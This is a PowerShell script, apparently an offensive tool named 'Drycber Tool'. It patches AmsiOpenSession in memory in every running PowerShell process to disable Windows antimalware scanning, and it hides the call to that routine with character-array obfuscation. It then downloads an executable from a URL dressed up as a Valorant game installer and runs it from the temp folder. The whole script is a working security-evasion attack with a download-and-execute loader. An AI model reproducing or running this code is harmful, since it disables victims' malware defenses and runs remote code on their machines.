function Invoke-DrycberAMSI {
    param (
        [int]$ProcessId
    )

    # Define required Win32 API functions
    $kernel32 = Add-Type -Name 'Win32' -Namespace 'Drycber' -MemberDefinition @"
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
"@ -PassThru

    # Constants
    $PROCESS_VM_OPERATION = 0x0008
    $PROCESS_VM_READ = 0x0010
    $PROCESS_VM_WRITE = 0x0020

    Write-Host "[>] Targeting ProcessId $ProcessId"
    
    # Open the target process
    $handle = $kernel32::OpenProcess($PROCESS_VM_OPERATION -bor $PROCESS_VM_READ -bor $PROCESS_VM_WRITE, $false, $ProcessId)
    if ($handle -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to open process!" -ForegroundColor Red
        return
    }
    Write-Host "[+] Process opened: Handle -> $handle"

    # Load amsi.dll and locate AmsiOpenSession
    $amsiDll = $kernel32::LoadLibrary("amsi.dll")
    if ($amsiDll -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to load amsi.dll!" -ForegroundColor Red
        return
    }
    Write-Host "[+] amsi.dll loaded at -> $amsiDll"

    $amsiOpenSession = $kernel32::GetProcAddress($amsiDll, "AmsiOpenSession")
    if ($amsiOpenSession -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to locate AmsiOpenSession!" -ForegroundColor Red
        return
    }
    Write-Host "[+] AmsiOpenSession located at -> $amsiOpenSession"

    # Calculate the patch address
    $patchAddress = [IntPtr]($amsiOpenSession.ToInt64() + 3)
    Write-Host "[+] Attempting to patch at -> $patchAddress"

    # Patch AMSI by writing a single 0xEB byte
    $patch = [byte[]](0xEB)
    $bytesWritten = 0
    $result = $kernel32::WriteProcessMemory($handle, $patchAddress, $patch, 1, [ref]$bytesWritten)
    if ($result -eq $true) {
        Write-Host "[!] AMSI successfully patched!" -ForegroundColor Green
    } else {
        Write-Host "[!] Failed to patch AMSI!" -ForegroundColor Red
    }

    # Close handle
    $kernel32::CloseHandle($handle)
}

function Patch-AllPowershells {
    Write-Host "[>] Searching for PowerShell processes..."
    Get-Process | ForEach-Object {
        if ($_.ProcessName -eq "powershell") {
            Write-Host "[>] Found PowerShell PID: $($_.Id)"
            Invoke-DrycberAMSI -ProcessId $_.Id
        }
    }
}

# Obfuscated Execution
Write-Host ("[>] " + [string]::Join("", ('D', 'r', 'y', 'c', 'b', 'e', 'r', ' ', 'T', 'o', 'o', 'l'))) 
$a = [scriptblock]::Create((('P', 'a', 't', 'c', 'h', '-', 'A', 'l', 'l', 'P', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l', 's') -join ''))
&$a

Invoke-DownloadAndExecute -Url "https://valorant.secure.dyn.riotcdn.net/channels/public/x/installer/current/live.live.ap.exe"

function Invoke-DownloadAndExecute {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Url,

        [Parameter(Mandatory=$false)]
        [string]$Destination = "$env:TEMP\valorant.exe"
    )

    try {
        Write-Host "Downloading file from $Url..."
        Invoke-WebRequest -Uri $Url -OutFile $Destination

        Write-Host "Executing downloaded file: $Destination"
        Start-Process -FilePath $Destination

        Write-Host "Execution started successfully."
    }
    catch {
        Write-Error "An error occurred: $_"
    }
}
